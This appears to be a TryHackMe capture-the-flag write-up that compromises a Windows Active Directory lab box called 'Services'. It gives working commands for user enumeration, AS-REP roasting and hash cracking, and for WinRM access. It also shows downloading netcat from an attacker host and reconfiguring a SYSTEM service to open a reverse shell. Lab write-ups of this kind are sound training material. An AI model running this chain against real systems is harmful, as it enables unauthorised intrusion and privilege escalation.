---
layout: writeup
name: "Services"
platform: "TryHackMe"
category: "thm"
difficulty: "Medium"
permalink: /writeups/thm/services/
os: "TryHackMe"
date: 2025-11-12
pwned: true
---
# 🧪 Services – TryHackMe

**IP Address:** `10.201.39.158`  
**Difficulty:** Medium  
**Platform:** TryHackMe  

---

## 🧭 Overview

This box was a Windows Server in an Active Directory environment.  
The attack path involved enumerating usernames from a website, validating them with Kerbrute, performing an AS-REP roast to get a password, obtaining WinRM access, and then abusing `Server Operators` group membership to modify a service for privilege escalation to SYSTEM.

---

## 🔍 Enumeration

### Nmap / Rustscan
```bash
rustscan --ulimit 5000 -a $target -- -sC -sV -Pn -oN nmap_full
```
**Findings:**
- Domain: `services.local`
- SMB signing: Enabled, required
- Ports: 53, 80, 88, 135, 139, 389, 445, 464, 593, 636, 5985, 47001, multiple high RPC ports
- Web server: Microsoft IIS 10.0
- Kerberos: 88/tcp
- WinRM: 5985/tcp

---

### SMB Enumeration
```bash
netexec smb $target -u '' -p ''
netexec smb $target -u 'guest' -p ''
```
- Null session allowed enumeration of hostname/domain.
- Guest account disabled.

---

### Web Enumeration
- Found `j.doe@services.local` on the site.
- `/aboutus` contained:
```
Joanne Doe
Jack Rock
Will Masters
Johnny Larusso
```

---

### Username Generation
```bash
python ~/THM/Roasted/AD-Username-Generator/username-generate.py -u users.txt -o generated_users.txt
```

---

### Kerbrute User Enumeration
```bash
kerbrute userenum generated_users.txt --dc $target -d services.local
```
**Valid users found:**
- `j.doe@services.local`
- `w.masters@services.local`
- `j.rock@services.local`
- `j.larusso@services.local`

---

### AS-REP Roasting
```bash
impacket-GetNPUsers services.local/ -dc-ip $target -usersfile kusers.txt -outputfile hashes.txt
```
- Only `j.rock` vulnerable.

**Hash cracked with:**
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# Password: Serviceworks1
```

---

## 🎯 Foothold

### WinRM Access
```bash
netexec winrm $target -u 'j.rock' -p 'Serviceworks1'
evil-winrm -u 'j.rock' -p 'Serviceworks1' -i $target
```
Retrieved `user.txt`:
```
THM{ASr3p_R0****************}
```

---

## 🚀 Privilege Escalation

### Enumeration
- `whoami /all` → Member of **Server Operators** group.
- Server Operators can start/stop services and modify their executables.

---

### Service Abuse
Identified `AWSLiteAgent` service running with SYSTEM privileges.

Uploaded netcat:
```powershell
wget http://<attacker-ip>/nc.exe -o nc.exe
```

Changed service binary path:
```powershell
sc.exe config AWSLiteAgent binPath="C:\Users\j.rock\Desktop\nc.exe -e cmd.exe <attacker-ip> 80"
sc.exe stop AWSLiteAgent
sc.exe start AWSLiteAgent
```

---

### SYSTEM Shell
```bash
nc -lvnp 80
```
Connected as `NT AUTHORITY\SYSTEM`.

Retrieved `root.txt`:
```
THM{S3rv3r_0p************}
```

---

## 📜 Lessons Learned
- Always enumerate users from web content; many AD footholds start there.
- AS-REP roasting is quick win when pre-auth is disabled.
- `Server Operators` group is dangerous — service binary replacement is an easy SYSTEM privesc.

---

## 🖼 Proof
![Proof](https://raw.githubusercontent.com/inkedqt/ctf-writeups/main/Other/THM/Services/proof.png)
